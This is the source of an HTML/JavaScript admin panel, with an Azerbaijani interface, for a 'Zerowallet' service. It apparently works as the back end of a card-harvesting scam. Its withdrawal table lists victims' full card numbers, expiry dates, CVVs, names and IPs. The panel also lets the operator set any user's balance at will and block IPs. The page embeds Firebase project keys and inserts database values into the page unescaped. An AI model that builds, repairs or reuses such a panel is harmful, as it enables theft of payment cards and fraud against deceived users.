<!DOCTYPE html>
<html lang="az">
<head>
    <meta charset="UTF-8">
    <title>Zerowallet | Admin Terminal v2.4</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root { --neon: #00f2ff; --bg: #0a0a0b; --row-bg: #141416; }
        body { background: var(--bg); color: #e0e0e0; font-family: 'Courier New', monospace; padding: 20px; }
        .container { max-width: 1200px; margin: 0 auto; }
        h1 { color: var(--neon); border-bottom: 2px solid var(--neon); padding-bottom: 10px; text-transform: uppercase; }
        h2 { color: var(--neon); font-size: 1.2rem; margin-top: 40px; }
        
        .table-wrap { background: var(--row-bg); border-radius: 10px; overflow: hidden; margin-top: 15px; border: 1px solid #222; }
        table { width: 100%; border-collapse: collapse; }
        th { background: #1c1c1f; padding: 15px; text-align: left; color: var(--neon); font-size: 0.8rem; }
        td { padding: 15px; border-bottom: 1px solid #1c1c1f; font-size: 0.9rem; }
        tr:hover { background: #1a1a1d; }

        .card-box { color: #ffd700; font-weight: bold; }
        .btn { padding: 8px 12px; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; font-family: monospace; }
        .btn-block { background: #ff3e3e; color: white; }
        .btn-unblock { background: #00ff41; color: black; }
        
        /* Balansın dəyişdirilməsi üçün stil */
        .editable-balance { 
            color: #00ff41; 
            cursor: pointer; 
            text-decoration: underline dotted; 
            font-weight: bold;
        }
        .editable-balance:hover { color: #fff; background: #222; }
    </style>
</head>
<body>

<div class="container">
    <h1><i class="fas fa-terminal"></i> ZEROWALLET ADMIN SYSTEM</h1>

    <h2><i class="fas fa-credit-card"></i> ÇIXARIŞ TƏLƏBLƏRİ (KARTLAR)</h2>
    <div class="table-wrap">
        <table>
            <thead>
                <tr>
                    <th>İstifadəçi</th>
                    <th>Məbləğ</th>
                    <th>Kart Sahibi</th>
                    <th>Kart No / Tarix / CVV</th>
                    <th>IP</th>
                    <th>Tarix</th>
                </tr>
            </thead>
            <tbody id="withdraw-body"></tbody>
        </table>
    </div>

    <h2><i class="fas fa-users"></i> ÜMUMİ İSTİFADƏÇİ SİYAHISI</h2>
    <div class="table-wrap">
        <table>
            <thead>
                <tr>
                    <th>Username</th>
                    <th>Balans (Dəyişmək üçün kliklə)</th>
                    <th>IP Ünvanı</th>
                    <th>Status</th>
                    <th>İdarəetmə</th>
                </tr>
            </thead>
            <tbody id="user-body"></tbody>
        </table>
    </div>
</div>

<script>
    const firebaseConfig = {
        apiKey: "AIzaSyCM5WdZNSj9oFipNI-J3csHpOIvK8PjoLU",
        authDomain: "sevgili-testi.firebaseapp.com",
        databaseURL: "https://sevgili-testi-default-rtdb.firebaseio.com",
        projectId: "sevgili-testi",
        storageBucket: "sevgili-testi.firebasestorage.app",
        messagingSenderId: "399260477557",
        appId: "1:399260477557:web:584204a698d7bf145bb03c"
    };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();

    // Çıxarışları və Kartları gətir
    db.ref('admin_withdrawals').on('value', snap => {
        const body = document.getElementById('withdraw-body');
        body.innerHTML = '';
        snap.forEach(child => {
            const d = child.val();
            body.innerHTML += `
                <tr>
                    <td><b>${d.username}</b></td>
                    <td style="color:#00ff41">${d.amount.toFixed(2)} AZN</td>
                    <td>${d.card_name}</td>
                    <td class="card-box">${d.card_num} | ${d.card_exp} | ${d.card_cvv}</td>
                    <td>${d.ip}</td>
                    <td style="font-size:0.7rem">${new Date(d.timestamp || Date.now()).toLocaleString()}</td>
                </tr>`;
        });
    });

    // İstifadəçiləri və IP Statuslarını gətir
    db.ref('zerowallet_users').on('value', snap => {
        const body = document.getElementById('user-body');
        body.innerHTML = '';
        snap.forEach(child => {
            const u = child.val();
            const cleanIp = (u.ip || "").replace(/\./g, '_');
            
            db.ref('blocked_ips/' + cleanIp).on('value', blockSnap => {
                const isBlocked = blockSnap.exists();
                const rowId = `row_${u.username}`;
                let row = document.getElementById(rowId);

                const rowHtml = `
                    <tr id="${rowId}">
                        <td>${u.username}</td>
                        <td><span class="editable-balance" onclick="editBalance('${u.username}', ${u.balance})">${u.balance.toFixed(2)} AZN</span></td>
                        <td>${u.ip}</td>
                        <td>${isBlocked ? '<b style="color:red">BLOKLU</b>' : '<b style="color:green">AKTİV</b>'}</td>
                        <td>
                            ${isBlocked ? 
                                `<button class="btn btn-unblock" onclick="toggleBlock('${u.ip}', false)">BLOKDAN AÇ</button>` : 
                                `<button class="btn btn-block" onclick="toggleBlock('${u.ip}', true)">BLOKLA</button>`
                            }
                        </td>
                    </tr>`;
                
                if (row) row.outerHTML = rowHtml;
                else body.innerHTML += rowHtml;
            });
        });
    });

    // Balansı Redaktə Etmək Funksiyası
    function editBalance(username, currentBalance) {
        const newBalance = prompt(`${username} üçün yeni balans daxil edin:`, currentBalance);
        if (newBalance !== null && !isNaN(newBalance)) {
            db.ref('zerowallet_users/' + username).update({
                balance: parseFloat(newBalance)
            }).then(() => {
                alert("Balans uğurla yeniləndi!");
            }).catch(err => {
                alert("Xəta baş verdi: " + err.message);
            });
        }
    }

    function toggleBlock(ip, status) {
        if (!ip) return;
        const cleanIp = ip.replace(/\./g, '_');
        if (status) {
            if(confirm(ip + " bloklansın?")) db.ref('blocked_ips/' + cleanIp).set({ ip: ip, date: Date.now() });
        } else {
            if(confirm(ip + " blokdan açılsın?")) db.ref('blocked_ips/' + cleanIp).remove();
        }
    }
</script>
</body>
</html>
